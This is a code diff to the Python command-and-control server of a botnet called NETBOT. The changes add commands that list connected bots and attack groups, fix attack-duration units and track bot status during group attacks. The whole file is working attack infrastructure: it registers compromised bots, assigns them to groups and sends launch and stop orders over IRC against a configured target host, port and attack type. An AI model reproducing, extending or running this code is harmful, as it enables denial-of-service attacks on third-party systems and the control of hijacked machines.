@@ -38,11 +38,13 @@ BOT_ATTACK_STATUS_OFFLINE = "OFFLINE"
 COMMAND_STOP = "/stop"
 COMMAND_START = "/start"
 COMMAND_SET_PROPERTIES = "/setProperties"
-COMMAND_PRINT_PROPERTIES = "/printProperties"
+COMMAND_SHOW_PROPERTIES = "/showProperties"
 COMMAND_HELP = "/help"
 COMMAND_SAVE_PROPERTIES = "/saveProperties"
 COMMAND_IMPORT_PROPERTIES = "/importProperties"
 COMMAND_IRC_ATTACK = "/ircAttack"
+COMMAND_SHOW_BOTS = "/showBots"
+COMMAND_SHOW_GROUPS = "/showGroups"
 
 PROPERTIES_COMMUNICATION_MODE = "--communicationMode"
 PROPERTIES_SOCKET_HOST = "--socketHost"
@@ -55,15 +57,16 @@ PROPERTIES_IRC_CHANNEL_PASS = "--ircChannelPass"
 PROPERTIES_IRC_NICK = "--ircNick"
 PROPERTIES_IRC_NICK_PASS= "--ircNickPass"
 PROPERTIES_IRC_PASS = "--ircPass"
-PROPERTOES_IRC_VERBOSE_IRCSERVER_RESPONSES = "--ircVerboseServer"
+PROPERTIES_IRC_VERBOSE_IRCSERVER_RESPONSES = "--ircVerboseServer"
 PROPERTIES_IRC_PERMANENTMODE_MESSAGE_TIMEOUT = "--ircMessageTimeout"
-PROPERTIES_IRC_ATTACK_MODE = "--ircAttackMode"
 
 PROPERTIES_ATTACK_TARGET_HOST = "--attTargetHost"
 PROPERTIES_ATTACK_TARGET_PORT = "--attTargetPort"
 PROPERTIES_ATTACK_CODE = "--attCode"
 PROPERTIES_ATTACK_TYPE = "--attType"
 PROPERTIES_ATTACK_BURST_SECONDS = "--attBurstSeconds"
+
+PROPERTIES_BOTWELCOME_VERBOSE = "--botWelcomesVerbose"
 
 ARG_IRC_ATTACK_MODE_ALL = "ALL"
 ARG_IRC_ATTACK_MODE_ALL_START = "START"
@@ -106,6 +109,7 @@ print (""" ______             ______
 |_|   |_|\____)\___)______/ \___/ \___)1.0 from https://github.com/skavngr
                                        """)
 
+print("WELCOME TO NETBOT, CHECK /help IF NEED\n")
 
 def config():
 	#import netbot_config
@@ -124,20 +128,12 @@ def threaded(c):
 		data = c.recv(1024)
 		if not data:
 			global connected
-			connected = connected - 1;
+			connected = connected - 1
 			print('\x1b[0;30;41m' + ' Bot went Offline! ' + '\x1b[0m','Disconnected from CCC :', c.getpeername()[0], ':', c.getpeername()[1], '\x1b[6;30;43m' + ' Total Bots Connected:', connected,  '\x1b[0m')
 			break
 		c.send(config().encode())
 
 	#c.close() #No issues commented earlier.
-
-def ircDummyRefreshThread(ircServer, ircPort, ircChannel, ircChannelPass, ircNick, ircBotpass, ircBotnickpass):
-	dIrc = IRC()
-	dIrc.connect(ircServer, ircPort, ircChannel, ircChannelPass, ircNick, ircBotpass, ircBotnickpass)
-	while not stopRoutine:
-		dIrc.send(ircChannel, IRC_DUMMY_REFRESH)
-		time.sleep(5)
-
 
 # Server Communication Routine Thread
 def serverCommunicationRoutine(communicationMode):
@@ -175,7 +171,8 @@ def serverCommunicationRoutine(communicationMode):
 		ircNick = properties[PROPERTIES_IRC_NICK]
 		ircBotpass = properties.get(PROPERTIES_IRC_PASS, "")
 		ircBotnickpass = properties.get(PROPERTIES_IRC_NICK_PASS, "")
-		ircVerbose = properties.get(PROPERTOES_IRC_VERBOSE_IRCSERVER_RESPONSES, "true")
+		ircVerbose = properties.get(PROPERTIES_IRC_VERBOSE_IRCSERVER_RESPONSES, "false")
+		botVerbose = properties.get(PROPERTIES_BOTWELCOME_VERBOSE, "true")
 		sIrcPermanentMessageTimeout = properties.get(PROPERTIES_IRC_PERMANENTMODE_MESSAGE_TIMEOUT, "60")
 		ircPermanentMessageTimeout = 60
 		if sIrcPermanentMessageTimeout.isdigit():
@@ -217,11 +214,13 @@ def serverCommunicationRoutine(communicationMode):
 					if not newBot:				
 						newBot = Bot(botNick,time.time(),BOT_ATTACK_STATUS_HOLD)
 						bots.append(newBot)
-						print("New bot added, welcome " + botNick + ". Current bots: " + str(numberOfAvailableBots()))
+						if botVerbose.lower() == "true":
+							print("New bot added, welcome " + botNick + ". Current bots: " + str(numberOfAvailableBots()))
 					elif newBot.currentStatus == BOT_ATTACK_STATUS_OFFLINE:
 						newBot.lastHeartbeat = time.time()
 						newBot.currentStatus = BOT_ATTACK_STATUS_HOLD
-						print("Bot reconnected, nice to see you again " + botNick + ". Current bots: " + str(numberOfAvailableBots()))
+						if botVerbose.lower() == "true":
+							print("Bot reconnected, nice to see you again " + botNick + ". Current bots: " + str(numberOfAvailableBots()))
 					else:
 						newBot.lastHeartbeat = time.time()
 
@@ -249,6 +248,11 @@ def serverCommunicationRoutine(communicationMode):
 						if tNow - group.startSendedTime >= group.attackDuration:
 							irc.send(ircChannel, group.stopAttackSettings)
 							group.stopSendedTime = tNow 
+							for gBotNick in group.botNicks:
+								for bot in bots:
+									if gBotNick == bot.nick:
+										bot.currentStatus = BOT_ATTACK_STATUS_HOLD
+
 	print("SERVER ROUTINE ENDED")
 
 
@@ -257,7 +261,7 @@ def serverCommunicationRoutine(communicationMode):
 def createNewIrcAttackGroup(numberOfBots, attackDuration):
 	#global ircAttackGroups
 	botNicks = assignBotsToAttackGroup(numberOfBots)
-	gAttackSettings = config(BOT_ATTACK_STATUS_LAUNCH) + "_"
+	gAttackSettings = config() + "_"
 	gFirst = True
 	for gBotNick in botNicks:
 		if not gFirst:
@@ -266,8 +270,8 @@ def createNewIrcAttackGroup(numberOfBots, attackDuration):
 			gFirst = False
 			gAttackSettings += gBotNick
 	gStopAttackSettings = gAttackSettings.replace(BOT_ATTACK_STATUS_LAUNCH, BOT_ATTACK_STATUS_HOLD)
-	msAttackDuration = attackDuration * 60000
-	newGroup = IrcGroupAttack(botNicks, None, None, msAttackDuration, gAttackSettings, gStopAttackSettings)
+	sAttackDuration = int(attackDuration) * 60
+	newGroup = IrcGroupAttack(botNicks, None, None, sAttackDuration, gAttackSettings, gStopAttackSettings)
 	ircAttackGroups.append(newGroup)
 
 def assignBotsToAttackGroup(numberOfBots):
@@ -275,6 +279,7 @@ def assignBotsToAttackGroup(numberOfBots):
 	botsAdded = 0
 	for bot in bots:
 		if bot.currentStatus == BOT_ATTACK_STATUS_HOLD:
+			bot.currentStatus = BOT_ATTACK_STATUS_LAUNCH
 			botnicks.append(bot.nick)
 			botsAdded += 1
 			if botsAdded == numberOfBots:
@@ -302,7 +307,7 @@ def checkProperties():
 		pIrcChannel = properties.get(PROPERTIES_IRC_CHANNEL, None)
 		pIrcNick = properties.get(PROPERTIES_IRC_NICK, None)
 		if (not pIrcServer or not pIrcPort or not pIrcChannel or not pIrcNick):
-			print(f"For IRC communication you have to specify, at least: {PROPERTIES_IRC_SERVER} {PROPERTIES_IRC_PORT}" +
+			print(f"For IRC communication you have to specify, at least: {PROPERTIES_IRC_SERVER} {PROPERTIES_IRC_PORT} " +
 					f"{PROPERTIES_IRC_CHANNEL} {PROPERTIES_IRC_NICK}")
 			return False
 	else:
@@ -414,15 +419,21 @@ def existsBot(botNick):
 
 def updateBotsStatus(tNow):
 	#global bots
+	botVerbose = properties.get(PROPERTIES_BOTWELCOME_VERBOSE, "true")
 	for bot in bots:
 		if bot.currentStatus != BOT_ATTACK_STATUS_OFFLINE:
 			if tNow - bot.lastHeartbeat >= ircBotAliveTimeout:
 				bot.currentStatus = BOT_ATTACK_STATUS_OFFLINE
-				print("Bot timeout, bot disconnected, bye " + bot.nick + ". Current bots " + str(numberOfAvailableBots()))
+				if botVerbose.lower() == "true":
+					print("Bot timeout, bot disconnected, bye " + bot.nick + ". Current bots " + str(numberOfAvailableBots()))
 	
 def Main():
+	
 	global properties
 	properties = {}
+	properties[PROPERTIES_IRC_VERBOSE_IRCSERVER_RESPONSES] = "false"
+	properties[PROPERTIES_BOTWELCOME_VERBOSE] = "true"
+	properties[PROPERTIES_IRC_PERMANENTMODE_MESSAGE_TIMEOUT] = "60"
 	setProperties(sys.argv)
 
 	global connected
@@ -434,13 +445,11 @@ def Main():
 	global ircAttackGroups
 	ircAttackGroups = []
 
-	#communicationMode = COMMUNICATION_MODE_IRC
 	global stopRoutine
 	stopRoutine = False
 
 	global tServerRoutine
 	tServerRoutine = None
-	#tServerRoutine.start()
 
 	global ircPermanentMode
 	ircPermanentMode = False
@@ -457,7 +466,7 @@ def Main():
 			startServerRoutine()
 		elif sInput.lower().split()[0] == COMMAND_SET_PROPERTIES.lower():
 			setProperties(sInput.split())
-		elif sInput.lower() == COMMAND_PRINT_PROPERTIES.lower():
+		elif sInput.lower() == COMMAND_SHOW_PROPERTIES.lower():
 			print(properties)
 		elif sInput.lower().split()[0] == COMMAND_SAVE_PROPERTIES.lower():
 			saveProperties(sInput)
@@ -465,8 +474,42 @@ def Main():
 			importProperties(sInput)
 		elif sInput.lower().split()[0] == COMMAND_IRC_ATTACK.lower():
 			ircAttack(sInput.split())
+		elif sInput.lower() == COMMAND_SHOW_BOTS.lower():
+			printBots()
+		elif sInput.lower() == COMMAND_SHOW_GROUPS.lower():
+			printGroups()
+
+def printBots():
+	global bots
+	print("LIST OF BOTS (nick, currentStatus, seconds since last heartbeat):\n\n")
+	tNow = time.time()
+	for bot in bots:
+		print(bot.nick + " " + bot.currentStatus + " " + str(int(tNow - bot.lastHeartbeat)) + "\n")
+
+def printGroups():
+	global ircAttackGroups
+	print("LIST OF IRC ATTACK GROUPS (started, stoped, duration, botnicks):\n\n")
+	for group in ircAttackGroups:
+		started = "false"
+		stopped = "false"
+		if group.startSendedTime:
+			started = "true"
+		if group.stopSendedTime:
+			stopped = "true"
+		print("started: " + started + " stopped: " + stopped + " duration (min): " + str(int(group.attackDuration/60)) +  " botnicks: ")
+		print(group.botNicks)
+		print("\n\n")
+
 
 def ircAttack(sInputSplitted):
+	global stopRoutine
+	global tServerRoutine
+	pComMode = properties.get(PROPERTIES_COMMUNICATION_MODE, None)
+	if stopRoutine or not tServerRoutine or not tServerRoutine.is_alive() \
+	or not pComMode or not pComMode.lower() == COMMUNICATION_MODE_IRC.lower():
+		print("For irc attack u have to start an IRC communication routine")
+		return
+
 	global ircPermanentMode
 	bAttackProp = checkAttackProperties()
 	if not bAttackProp:
@@ -500,7 +543,7 @@ def ircAttack(sInputSplitted):
 			and sInputSplitted[3].isdigit() and int(sInputSplitted[3]) > 0:			
 				numberOfBots = int(sInputSplitted[2])
 				attackDuration = sInputSplitted[3]
-				if numberOfBots <= numberOfAvailableBots:
+				if numberOfBots <= numberOfAvailableBots():
 					createNewIrcAttackGroup(numberOfBots, attackDuration)
 				else:
 					print("Sad you dont have that number of bots!!!")
@@ -512,4 +555,5 @@ def ircAttack(sInputSplitted):
 		print("Bad ircAttack mode, only all or group modes allowed")	
 
 if __name__ == '__main__':
+	
 	Main()
